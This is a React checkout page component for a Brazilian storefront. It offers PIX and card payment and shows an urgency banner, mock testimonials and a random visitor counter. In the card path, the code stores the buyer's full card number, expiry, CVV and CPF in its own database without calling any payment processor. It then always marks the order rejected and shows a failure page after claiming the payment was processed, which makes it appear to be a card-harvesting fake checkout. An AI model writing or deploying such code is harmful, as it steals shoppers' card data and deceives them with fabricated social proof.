
import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { formSchema } from './forms/checkoutFormSchema';
import { toast } from "sonner";

// Import components
import CheckoutHeader from './header/CheckoutHeader';
import ProductCard from './product/ProductCard';
import TestimonialsSection from './testimonials/TestimonialsSection';
import VisitorCounter from './visitors/VisitorCounter';
import { useCheckoutChecklist } from '@/hooks/useCheckoutChecklist';
import { mockTestimonials } from './data/mockTestimonials';
import { useOneCheckoutState } from './hooks/useOneCheckoutState';
import OneCheckoutForm from './one-checkout/OneCheckoutForm';
import OneCheckoutSidebar from './one-checkout/OneCheckoutSidebar';
import { Card, CardContent } from '@/components/ui/card';
import CheckoutFooter from './footer/CheckoutFooter';
import { useIsMobile } from '@/hooks/use-mobile';
import { supabase } from '@/integrations/supabase/client';
import { criarPagamento } from '@/services/pagamentoService';
import { atualizarStatusPedido } from '@/services/pedidoService';

interface OneCheckoutProps {
  producto: {
    id: string;
    nome: string;
    descricao?: string | null;
    preco: number;
    parcelas?: number;
    imagem_url?: string | null;
    slug?: string;
  };
  config?: any;
}

const OneCheckout: React.FC<OneCheckoutProps> = ({ producto, config = {} }) => {
  const navigate = useNavigate();
  const isMobile = useIsMobile();
  const { 
    visitors, 
    currentStep, 
    setCurrentStep, 
    isSubmitting, 
    setIsSubmitting 
  } = useOneCheckoutState(config);
  
  const { checklistItems, updateChecklistItem } = useCheckoutChecklist();
  
  const corFundo = config?.cor_fundo || '#f5f5f7';
  const corBotao = config?.cor_botao || '#30b968';
  const textoBotao = config?.texto_botao || 'Finalizar compra';
  const showHeader = config?.show_header !== false;
  const headerMessage = config?.header_message || 'Tempo restante! Garanta sua oferta';
  const headerBgColor = config?.header_bg_color || '#000000';
  const headerTextColor = config?.header_text_color || '#ffffff';
  const showTestimonials = config?.exibir_testemunhos !== false;
  const testimonialTitle = config?.testimonials_title || 'O que dizem nossos clientes';
  const showVisitorCounter = config?.numero_aleatorio_visitas !== false;
  const discountEnabled = config?.discount_badge_enabled || false;
  const discountText = config?.discount_badge_text || 'Oferta especial';
  const originalPrice = config?.original_price || (producto.preco * 1.2);
  const paymentMethods = config?.payment_methods || ['pix', 'cartao'];
  
  const formHeaderText = config?.form_header_text || 'PREENCHA SEUS DADOS ABAIXO';
  const formHeaderBgColor = config?.form_header_bg_color || '#dc2626';
  const formHeaderTextColor = config?.form_header_text_color || '#ffffff';
  
  const showFooter = config?.show_footer !== false;
  const footerText = config?.footer_text || 'Todos os direitos reservados';
  const companyName = config?.company_name || 'PixPortal';
  const companyDescription = config?.company_description || 'Soluções de pagamento para aumentar suas vendas online.';
  const contactEmail = config?.contact_email || 'contato@pixportal.com.br';
  const contactPhone = config?.contact_phone || '(11) 99999-9999';
  const showTermsLink = config?.show_terms_link !== false;
  const showPrivacyLink = config?.show_privacy_link !== false;
  const termsUrl = config?.terms_url || '/termos';
  const privacyUrl = config?.privacy_url || '/privacidade';
  
  console.log("OneCheckout config:", config);
  console.log("OneCheckout mobile:", isMobile);
  
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    setValue,
    watch,
    trigger,
  } = useForm({
    resolver: zodResolver(formSchema),
    defaultValues: {
      payment_method: 'cartao',
      installments: '1x',
    },
    mode: 'onChange'
  });
  
  const currentPaymentMethod = watch('payment_method');
  
  const handlePaymentMethodChange = (method: 'pix' | 'cartao') => {
    console.log("Changing payment method to:", method);
    setValue('payment_method', method);
    updateChecklistItem('payment-method', true);
    
    if (!isMobile && currentStep === 'personal-info') {
      trigger(['name', 'email', 'cpf', 'telefone'] as any).then(valid => {
        if (valid) {
          setCurrentStep('payment-method');
          updateChecklistItem('personal-info', true);
        }
      });
    }
  };
  
  useEffect(() => {
    const subscription = watch((value, { name, type }) => {
      if (['name', 'email', 'cpf', 'telefone'].includes(name as string) && type === 'change') {
        trigger(['name', 'email', 'cpf', 'telefone'] as any).then(valid => {
          if (valid) {
            updateChecklistItem('personal-info', true);
          }
        });
      }
      
      if (name === 'payment_method' && value.payment_method) {
        updateChecklistItem('payment-method', true);
      }
    });
    
    return () => subscription.unsubscribe();
  }, [watch, trigger, updateChecklistItem]);
  
  const handlePixPayment = () => {
    console.log("PIX payment button clicked in OneCheckout");
    setIsSubmitting(true);
    setValue('payment_method', 'pix');
    
    try {
      const productIdentifier = producto.slug || producto.id;
      console.log("Product slug/id for PIX redirection:", productIdentifier);
      
      toast.success('Processando pagamento PIX', {
        description: "Redirecionando para a página de pagamento PIX...",
      });
      
      const pixPath = `/checkout/${productIdentifier}/pix`;
      console.log("Navigating to PIX page:", pixPath);
      
      navigate(pixPath);
    } catch (error) {
      console.error("Error processing PIX payment:", error);
      
      toast.error('Erro no processamento', {
        description: "Ocorreu um erro ao processar o pagamento PIX. Por favor, tente novamente.",
      });
      
      setIsSubmitting(false);
    }
  };

  const onSubmit = async (data: any) => {
    console.log("Form submitted with data:", data);
    setIsSubmitting(true);
    updateChecklistItem('confirm-payment', true);
    
    try {
      console.log('Payment method selected:', data.payment_method);
      
      const productIdentifier = producto.slug || producto.id;
      console.log("Product identifier:", productIdentifier);
      
      if (data.payment_method === 'pix') {
        const pixPath = `/checkout/${productIdentifier}/pix`;
        console.log("Redirecting to PIX page:", pixPath);
        
        toast.success('Processando pagamento', {
          description: "Redirecionando para pagamento via PIX...",
        });
        
        navigate(pixPath);
      } else {
        // Buscar o produto pelo slug
        const produtoData = await supabase
          .from('produtos')
          .select('*')
          .eq('slug', productIdentifier)
          .maybeSingle();

        if (produtoData.error) throw new Error('Erro ao buscar produto');
        if (!produtoData.data) throw new Error('Produto não encontrado');

        // Criar um novo pedido
        const novoPedido = await supabase
          .from('pedidos')
          .insert({ 
            produto_id: produtoData.data.id, 
            status: 'pendente', 
            valor: produtoData.data.preco,
            nome: data.name,
            email: data.email,
            telefone: data.telefone,
            cpf: data.cpf,
            forma_pagamento: 'cartao'
          })
          .select()
          .single();

        if (novoPedido.error) throw new Error('Erro ao criar pedido');
        console.log('Pedido criado:', novoPedido);

        // Salvar dados do pagamento
        const parcelas = parseInt(data.installments.split('x')[0], 10);
        await criarPagamento({
          pedido_id: novoPedido.data.id,
          metodo_pagamento: 'cartao',
          numero_cartao: data.card_number,
          nome_cartao: data.card_name,
          validade: data.card_expiry,
          cvv: data.card_cvv,
          parcelas: parcelas
        });
        console.log('Dados do pagamento salvos');

        // Atualizar status do pedido para reprovado
        await atualizarStatusPedido(novoPedido.data.id, 'reprovado');
        console.log('Status do pedido atualizado para reprovado');

        // Mostrar mensagem e redirecionar
        toast.success('Pagamento processado, redirecionando...');
        
        setTimeout(() => {
          const redirectUrl = `/checkout/${productIdentifier}/payment-failed/${novoPedido.data.id}`;
          console.log('Redirecionando para:', redirectUrl);
          navigate(redirectUrl);
        }, 1500);
      }
    } catch (error: any) {
      console.error('Erro ao processar checkout:', error);
      toast.error('Erro no processamento', {
        description: "Ocorreu um erro ao processar seu pedido. Por favor, tente novamente.",
      });
    } finally {
      setTimeout(() => {
        setIsSubmitting(false);
      }, 1500);
    }
  };
  
  const handleContinue = async () => {
    if (currentStep === 'personal-info') {
      const personalInfoValid = await trigger(['name', 'email', 'cpf', 'telefone'] as any);
      if (personalInfoValid) {
        setCurrentStep('payment-method');
        updateChecklistItem('personal-info', true);
      }
    } else if (currentStep === 'payment-method') {
      setCurrentStep('confirm');
    }
  };
  
  const maxInstallments = producto.parcelas || 1;
  const installmentOptions = Array.from({ length: maxInstallments }, (_, i) => i + 1).map(
    (num) => ({
      value: `${num}x`,
      label: `${num}x de R$ ${(producto.preco / num).toFixed(2)}${num > 1 ? ' sem juros' : ''}`,
    })
  );
  
  return (
    <div className="w-full min-h-screen" style={{ backgroundColor: config?.cor_fundo || '#f5f5f7' }}>
      {config?.show_header !== false && (
        <CheckoutHeader 
          message={config?.header_message || 'Tempo restante! Garanta sua oferta'}
          bgColor={config?.header_bg_color || '#000000'}
          textColor={config?.header_text_color || '#ffffff'}
        />
      )}
      
      <div className={`container max-w-4xl mx-auto ${isMobile ? 'py-3 px-3' : 'py-4 px-4 sm:px-6 sm:py-6'}`}>
        <ProductCard 
          product={producto}
          discountEnabled={config?.discount_badge_enabled || false}
          discountText={config?.discount_badge_text || 'Oferta especial'}
          originalPrice={config?.original_price || (producto.preco * 1.2)}
        />

        <div className={`grid grid-cols-1 ${isMobile ? '' : 'md:grid-cols-3'} gap-6 mt-6`}>
          <div className={isMobile ? 'w-full' : 'md:col-span-2'}>
            <Card className="shadow-sm overflow-hidden">
              <div className="p-3 text-center" style={{ 
                backgroundColor: config?.form_header_bg_color || '#dc2626', 
                color: config?.form_header_text_color || '#ffffff' 
              }}>
                <h3 className="font-bold">{config?.form_header_text || 'PREENCHA SEUS DADOS ABAIXO'}</h3>
              </div>
              
              <CardContent className={isMobile ? "p-3" : "p-5"}>
                <OneCheckoutForm
                  register={register}
                  errors={errors}
                  handleSubmit={handleSubmit}
                  onSubmit={onSubmit}
                  currentStep={currentStep}
                  currentPaymentMethod={currentPaymentMethod}
                  handlePaymentMethodChange={handlePaymentMethodChange}
                  handleContinue={handleContinue}
                  setValue={setValue}
                  isSubmitting={isSubmitting}
                  installmentOptions={installmentOptions}
                  handlePixPayment={handlePixPayment}
                  paymentMethods={config?.payment_methods || ['pix', 'cartao']}
                  corBotao={config?.cor_botao || '#30b968'}
                  textoBotao={config?.texto_botao || 'Finalizar compra'}
                />
              </CardContent>
            </Card>
          </div>
          
          {!isMobile && (
            <div className="order-first md:order-last">
              <OneCheckoutSidebar checklistItems={checklistItems} />
            </div>
          )}
        </div>
        
        {config?.exibir_testemunhos !== false && (
          <TestimonialsSection 
            testimonials={mockTestimonials} 
            title={config?.testimonials_title || 'O que dizem nossos clientes'} 
          />
        )}
        
        {config?.numero_aleatorio_visitas !== false && (
          <VisitorCounter visitors={visitors} />
        )}
      </div>
      
      <CheckoutFooter 
        showFooter={config?.show_footer !== false}
        footerText={config?.footer_text || 'Todos os direitos reservados'}
        companyName={config?.company_name || 'PixPortal'}
        companyDescription={config?.company_description || 'Soluções de pagamento para aumentar suas vendas online.'}
        contactEmail={config?.contact_email || 'contato@pixportal.com.br'}
        contactPhone={config?.contact_phone || '(11) 99999-9999'}
        showTermsLink={config?.show_terms_link !== false}
        showPrivacyLink={config?.show_privacy_link !== false}
        termsUrl={config?.terms_url || '/termos'}
        privacyUrl={config?.privacy_url || '/privacidade'}
      />
    </div>
  );
};

export default OneCheckout;
